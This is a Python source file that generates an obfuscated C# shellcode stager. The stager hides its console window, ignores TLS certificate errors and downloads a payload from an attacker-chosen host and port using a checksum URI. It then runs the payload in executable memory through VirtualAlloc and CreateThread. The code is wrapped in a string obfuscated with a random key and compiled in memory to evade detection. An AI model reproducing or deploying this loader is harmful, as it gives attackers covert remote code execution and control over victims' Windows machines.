# -*- coding: utf-8 -*-
import random
import string
import base64
from base64 import b64encode

def randomString():
    return ''.join([random.choice(string.ascii_letters) for n in range(12)])

def checksum8(s):
	return sum([ord(ch) for ch in s]) % 0x100

def genHTTPChecksum():
	chk = string.ascii_letters + string.digits
	for x in range(64):
		uri = "".join(random.sample(chk,3))
		r = "".join(sorted(list(string.ascii_letters+string.digits), key=lambda *args: random.random()))
		for char in r:
			if checksum8(uri + char) == 92:
				return uri + char 

def generateMPBinLoader(mpBinProto, mpBinLhost, mpBinLport, mpBinArch, mpBinSsize):
    
    if mpBinProto == "https":
        mpBinSSLChk = "ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, sslPolicyErrors) => true;"
    else:
        mpBinSSLChk = ""

    if mpBinArch == "x86":
        mpBinArch = "UInt32"
    elif mpBinArch == "x64":
        mpBinArch = "UInt64"
    
    mpBinNSpace = randomString()
    mpBinLClass = randomString()
    loaderHost = mpBinProto+"://"+mpBinLhost+":"+mpBinLport+"/"+genHTTPChecksum()
    loaderBase = '''using System;using System.Net;using System.Runtime.InteropServices; namespace {24} {{ public class {25} {{ [DllImport ("kernel32")] private static extern {23} VirtualAlloc ({23} {0}, {23} {1}, {23} {2}, {23} {3}); [DllImport ("kernel32")] private static extern IntPtr CreateThread ({23} {4}, {23} {5}, {23} {6}, IntPtr {7}, {23} {8}, ref {23} {9}); [DllImport ("kernel32")] private static extern {23} WaitForSingleObject (IntPtr {10}, {23} {11}); [DllImport ("kernel32.dll")] static extern IntPtr GetConsoleWindow (); [DllImport ("user32.dll")] static extern bool ShowWindow (IntPtr {12}, int {13}); public static void Main () {{ShowWindow (GetConsoleWindow (), 0);{14}WebClient {15} = new System.Net.WebClient ();{15}.Headers.Add ("User-Agent", "Mozilla/5.0 (compatible; MSIE 11.0; Trident/7.0; rv:11.0)");{15}.Headers.Add ("Accept", "*/*");{15}.Headers.Add ("Accept-Language", "en-gb,en;q=0.5");byte[] {16} = null;{16} = {15}.DownloadData ("{26}");byte[] {17} = new byte[{16}.Length - {18}];Array.Copy ({16}, {18}, {17}, 0, {17}.Length);{23} {19} = VirtualAlloc (0, ({23}) {17}.Length, 0x1000, 0x40);Marshal.Copy ({17}, 0, (IntPtr) ({19}), {17}.Length);IntPtr {20} = IntPtr.Zero;{23} {21} = 0;IntPtr {22} = IntPtr.Zero;{20} = CreateThread (0, 0, {19}, {22}, 0, ref {21});WaitForSingleObject ({20}, 0xFFFFFFFF);}}}}}}'''.format(randomString(), randomString(), randomString(), randomString(),randomString(), randomString(), randomString(), randomString(), randomString(), randomString(), randomString(), randomString(), randomString(), randomString(), mpBinSSLChk, randomString(), randomString(), randomString(), mpBinSsize, randomString(), randomString(), randomString(), randomString(), mpBinArch, mpBinNSpace, mpBinLClass, loaderHost)
    loaderKey = (''.join(random.sample("hlldzé!^+%&/()=?_<>£#$[]|",len("hlldzé!^+%&/()=?_<>£#$[]|")))[0:3])
    loaderCode = loaderKey.join([loaderBase[i:i+1] for i in range(0, len(loaderBase), 1)]).replace("\"", "\\\"")
    loaderFinal = '''using System;using System.CodeDom.Compiler;using System.Reflection;using Microsoft.CSharp;namespace {0} {{public class {1} {{public static void Main () {{string {2} = "{3}".Replace("{4}", "");CSharpCodeProvider {5} = new CSharpCodeProvider ();CompilerParameters {6} = new CompilerParameters (new [] {{"mscorlib.dll", "System.dll"}});{6}.GenerateInMemory = true;{6}.ReferencedAssemblies.Add (Assembly.GetEntryAssembly ().Location);CompilerResults {7} = {5}.CompileAssemblyFromSource ({6}, {2});Assembly {8} = {7}.CompiledAssembly;Type {9} = {8}.GetType ("{10}.{11}");MethodInfo {12} = {9}.GetMethod ("Main");{12}.Invoke (null, null);}}}}}}'''.format(randomString(), randomString(), randomString(), loaderCode, loaderKey, randomString(), randomString(), randomString(), randomString(), randomString(), mpBinNSpace, mpBinLClass, randomString())
    return loaderFinal
